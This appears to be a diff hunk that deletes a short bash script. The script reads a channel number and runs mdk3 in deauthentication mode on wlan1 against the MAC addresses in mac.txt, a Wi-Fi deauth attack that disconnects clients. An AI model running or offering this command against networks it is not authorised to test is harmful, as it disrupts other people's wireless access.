@@ -1,6 +1,0 @@
-#!/bin/bash
-
-echo "Deaut Target"
-read -p "Channel : "c;
-sleep 1
-mdk3 wlan1 d -b mac.txt -c $c
